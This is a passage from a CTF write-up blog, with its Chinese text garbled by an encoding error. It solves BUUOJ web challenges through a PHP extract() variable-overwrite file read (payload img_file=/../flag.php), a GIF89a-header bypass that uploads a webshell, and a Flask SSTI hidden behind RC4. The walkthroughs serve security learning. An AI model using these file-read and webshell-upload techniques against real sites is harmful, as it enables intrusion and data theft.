		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;/View/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$viewName</span><span class="token punctuation">}</span></span>.php&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>æ¥ç€é€†å‘è¿½è¸ªè°ƒ<code>loadView</code>çš„åœ°æ–¹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004214232.png" alt="image-20201004212235209"></p> <p>åœ¨<code>LoginController</code>è¿™ä¸ªæ§åˆ¶å™¨ä¸­ä¼ å…¥<code>loadView</code>æ–¹æ³•ä¸­çš„å‚æ•°éƒ½æ˜¯å†™æ­»äº†çš„ï¼Œæ‰€ä»¥æš‚ä¸”ä¸æ˜¯æˆ‘ä»¬è¦å®¡è®¡çš„é‡ç‚¹ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>UserController</code>è¿™ä¸ªæ§åˆ¶å™¨ä¸­åŒæ ·è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼ŒåŒæ—¶ç”¨ä¸€ä¸ªå˜é‡ä½œä¸º<code>loadView</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œç»“åˆä¹‹å‰æˆ‘ä»¬æ‰€æåˆ°çš„å˜é‡è¦†ç›–ï¼Œæ‰€ä»¥å¯ä»¥è·Ÿè¿›è¯¥æ§åˆ¶å™¨ï¼Œè¿›ä¸€æ­¥è¿›è¡Œå®¡è®¡ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code># UserController.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token comment">/**
* ç”¨æˆ·æ§åˆ¶å™¨
*/</span>
<span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">{</span>
	<span class="token comment">// è®¿é—®åˆ—è¡¨</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
		<span class="token variable">$userModel</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$userModel</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userList'</span><span class="token punctuation">,</span> <span class="token variable">$listData</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userIndex'</span><span class="token punctuation">,</span><span class="token variable">$listData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>åœ¨ç¬¬äºŒä¸ªæ–¹æ³•<code>actionIndex</code>ä¸­æŠŠ<code>$_REQUEST</code>è¿™ä¸ªæ•°ç»„èµ‹å€¼ç»™äº†<code>$listData</code>ï¼Œç„¶åä¼ å…¥äº†<code>loadView</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ã€‚ä¼ å…¥è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>userIndex</code>ï¼Œæˆ‘ä»¬å†è·Ÿè¿›<code>viewIndex</code>æ–¹æ³•è¿›è¡Œåç»­çš„å®¡è®¡ã€‚</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;/View/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$viewName</span><span class="token punctuation">}</span></span>.php&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>è¯¥æ–¹æ³•ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œä¸€ä¸‹è·¯å¾„çš„æ‹¼æ¥å¾—åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œç„¶åç›´æ¥åŒ…å«è¯¥æ–‡ä»¶ï¼Œå› ä¸ºä¼ å…¥<code>loadView</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>userIndex</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›<code>userIndex.php</code>ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>row<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>col-sm-4<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>å…³äºæˆ‘<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>æˆ‘çš„ç…§ç‰‡:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>fakeimg<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/../favicon.ico'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span>
                <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src=&quot;'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&quot;&gt;'</span><span class="token punctuation">;</span>       <span class="token comment">//å›¾ç‰‡å½¢å¼å±•ç¤º</span>
                <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
                    
Â·Â·Â·Â·Â·Â·
                    
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$app_img_file</span> <span class="token operator">=</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span> <span class="token comment">// å›¾ç‰‡è·¯å¾„</span>
        <span class="token variable">$img_info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å–å¾—å›¾ç‰‡çš„å¤§å°ï¼Œç±»å‹ç­‰</span>

        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å›¾ç‰‡æ˜¯å¦å¯è¯»æƒé™</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$filesize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">chunk_split</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// base64ç¼–ç </span>
            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$img_info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment">//åˆ¤è¯»å›¾ç‰‡ç±»å‹</span>
                <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'data:image/'</span> <span class="token punctuation">.</span> <span class="token variable">$img_type</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">';base64,'</span> <span class="token punctuation">.</span> <span class="token variable">$file_content</span><span class="token punctuation">;</span><span class="token comment">//åˆæˆå›¾ç‰‡çš„base64ç¼–ç </span>

        <span class="token punctuation">}</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token variable">$img_base64</span><span class="token punctuation">;</span> <span class="token comment">//è¿”å›å›¾ç‰‡çš„base64</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p><code>$img_file</code>æ˜¯æˆ‘ä»¬é€šè¿‡å˜é‡è¦†ç›–å¯ä»¥éšæ„æ›´æ”¹çš„ï¼Œç„¶åä¼šå°†è¯¥å˜é‡æ‰€å¯¹åº”çš„æ–‡ä»¶å†…å®¹è¿›è¡Œb64ç¼–ç å¤„ç†ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š<strong>è®¿é—®å¯¹åº”çš„æ§åˆ¶å™¨ï¼Œé€šè¿‡å˜é‡è¦†ç›–ä¿®æ”¹<code>$img_file</code>ä¸º<code>flag.php</code>ï¼Œå¾—åˆ°flagã€‚</strong></p> <p>æˆ‘ä»¬éœ€è¦çš„æ§åˆ¶å™¨æ˜¯<code>UserController</code>ï¼Œè¦ä½¿ç”¨çš„æ–¹æ³•æ˜¯è¯¥æ§åˆ¶å™¨ä¸‹çš„<code>actionIndex</code>ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹få‚æ•°ä¸º<code>User/Index</code>ï¼ŒåŒæ—¶ä¼ å…¥<code>img_file</code>å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://322ce0e8-adc4-4718-819d-553aa6899ac5.node3.buuoj.cn/index.php?r=User/Index&amp;img_file=/../flag.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004213838.png" alt="image-20201004213838374"></p> <p>è§£ç ä¸€ä¸‹ï¼Œæ‹¿åˆ°flagï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004213921.png" alt="image-20201004213921250"></p> <div class="custom-block warning"><p class="custom-block-title">æ³¨æ„</p> <p>è¿™é‡Œè¦æ³¨æ„è·¯å¾„çš„é—®é¢˜ï¼Œå› ä¸ºåœ¨actionIndexä¸­å·²ç»æŠŠè·¯å¾„å®šä¹‰åˆ°äº†userIndex.phpï¼Œæ‰€ä»¥è¦è®¿é—®flag.phpè¿˜éœ€è¦è·³å›ä¸Šä¸€å±‚ç›®å½•ï¼Œä¸”ç”±äºå®šä¹‰çš„è·¯å¾„æ²¡æœ‰ç”¨/ç»“å°¾ï¼Œæ‰€ä»¥è¿˜éœ€è¦åŠ ä¸€ä¸ª/å·ï¼Œäºæ˜¯å¾—åˆ°æœ€åçš„payloadæ˜¯img_file=/../flag.php</p></div> <h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="header-anchor">#</a> æ–‡ä»¶ä¸Šä¼ </h2> <h3 id="cv-maker"><a href="#cv-maker" class="header-anchor">#</a> CV Maker</h3> <p>**è€ƒç‚¹ï¼š<em>exif_imagetype()<em>çš„ç»•è¿‡</em></em></p> <p>è¿™ä¸ªå‡½æ•°çš„ç»•è¿‡åœ¨æˆ‘ä»¥å‰ä¸€ç¯‡æ–‡ç« ä¸­å†™åˆ°è¿‡ï¼š<a href="https://f4de.ink/2020/06/10/SUCTF-2019-EasyWeb/" target="_blank" rel="noopener noreferrer">è¿™é‡Œ<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>é¢˜ç›®é™¤äº†æ³¨å†Œç™»å½•å…¶ä»–ç‚¹å…¶ä»–åœ°æ–¹éƒ½æ²¡å•¥ååº”ï¼Œé‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•è¿›å»ï¼Œåªæœ‰ä¸€ä¸ªä¸Šä¼ å¤´åƒçš„åŠŸèƒ½ã€‚</p> <p>ä¸Šä¼ æ™®é€šä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ä¼šå›æ˜¾è¿™æ ·çš„ä¸œè¥¿ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162315.png" alt="20200330145540890"></p> <p>é‚£å°±ç›´æ¥ç”¨GIF89aæ–‡ä»¶å¤´ç»•ä¸€ä¸‹è¯•è¯•çœ‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162359.png" alt="image-20200715162359334"></p> <p>ç›´æ¥æ˜¾ç¤ºä¸Šä¼ æˆåŠŸäº†ï¼Œï¼Œç„¶åå°±çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä½ç½®ï¼Œå³é”®ç‚¹å‡»å›¾ç‰‡é“¾æ¥æ£€æŸ¥ä¸€ä¸‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162811.png" alt="image-20200715162632689"></p> <p>æ‰¾äº†çš„shellçš„ä½ç½®ï¼Œç„¶åèšå‰‘è¿ä¸€ä¸‹ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œç›´æ¥è¯»å–å³å¯</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162955.png" alt="image-20200715162939025"></p> <h2 id="ssti"><a href="#ssti" class="header-anchor">#</a> SSTI</h2> <h3 id="double-secret"><a href="#double-secret" class="header-anchor">#</a> Double Secret</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>flaskæ¡†æ¶å¼€å¯debugæ¨¡å¼ä¼šæš´éœ²æºç </strong></li> <li><strong>RC4åŠ å¯†ç®—æ³•</strong></li></ul> <p>è¿™é“é¢˜ç›®ä¸€å¼€å§‹æ²¡ç»™ä»€ä¹ˆæç¤ºï¼Œè®©æˆ‘ä»¬å»Find Secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201248.png" alt="image-20200718201241502"></p> <p>æ‰«äº†åå°æ²¡å•¥ä¸œè¥¿ï¼Œç„¶åçœ‹äº†wpæ‰çŸ¥é“æ­£ç¡®å§¿åŠ¿æ˜¯å»è®¿é—®/secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201436.png" alt="image-20200718201436427"></p> <p>æŒ‰ç…§è¿™ä¸ªæ€è·¯ï¼Œé‚£ä¹ˆ&quot;Tell me your secret&quot;åº”è¯¥å°±æ˜¯è®©æˆ‘ä»¬ä¼ å…¥å‚æ•°secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201529.png" alt="image-20200718201529213"></p> <p>ä¼ å…¥å‚æ•°æœ‰å›æ˜¾ï¼Œå­˜åœ¨sstiå¯èƒ½æ€§ï¼Œä½†æ˜¯å›æ˜¾å€¼å’Œæˆ‘ä»¬è¾“å…¥å€¼ä¸ç›¸åŒï¼Œä¼ å…¥2è¯•è¯•</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201653.png" alt="image-20200718201653362"></p> <p>ç›´æ¥æŠ¥é”™ï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ï¼Œå€Ÿæ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ†å…³é”®æºç </p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203435.png" alt="image-20200718201750325"></p> <p>æºç å¦‚ä¸‹(å…³é”®åœ°æ–¹å·²åšæ³¨é‡Š)ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
    <span class="token comment">#ä½¿ç”¨RC4åŠ å¯†ç®—æ³•ï¼Œå¯†é’¥ä¸º&quot;HereIsTreasure&quot;</span>
    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">&quot;HereIsTreasure&quot;</span><span class="token punctuation">)</span>   <span class="token comment">#è§£å¯†</span>
    <span class="token comment">#å°†æˆ‘ä»¬ä¼ å…¥çš„secretå‚æ•°è¿›è¡ŒRC4åŠ å¯†</span>
    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
 	<span class="token comment">#è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œå¹¶ç”¨safeå‡½æ•°è¿‡æ»¤</span>
    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>
    <span class="token keyword">return</span> a
Open an interactive python shell <span class="token keyword">in</span> this frame 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>ç¡®å®å­˜åœ¨sstiæ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯æœåŠ¡ç«¯ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒRC4ç®—æ³•åŠ å¯†ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå›æ˜¾å’Œæˆ‘ä»¬ä¼ å‚çš„å€¼ä¸ç›¸åŒï¼Œä½†æ˜¯RC4æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¦‚æœçŸ¥é“å¯†é’¥ï¼Œå°±å¯ä»¥è¿›è¡Œè§£å¯†ã€‚</p> <p>æ‰€ä»¥é¢˜ç›®æ€è·¯å°±æ˜¯å°†payloadè¿›è¡Œä¸€æ¬¡RC4è§£å¯†ï¼Œæˆ‘ä»¬ä¼ å…¥è§£å¯†åçš„æ•°æ®å†ç»è¿‡ä¸€æ¬¡RC4åŠ å¯†ä¹‹åå°±æˆäº†æ­£å¸¸çš„payloadã€‚</p> <p>ä¸‹é¢çš„RC4åŠ å¯†è§£å¯†è„šæœ¬æ¥è‡ªäºä¸€ä½å¸ˆå‚…çš„åšå®¢ï¼š<a href="https://0verwatch.top/RC4-python.html" target="_blank" rel="noopener noreferrer">è¿™é‡Œ<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 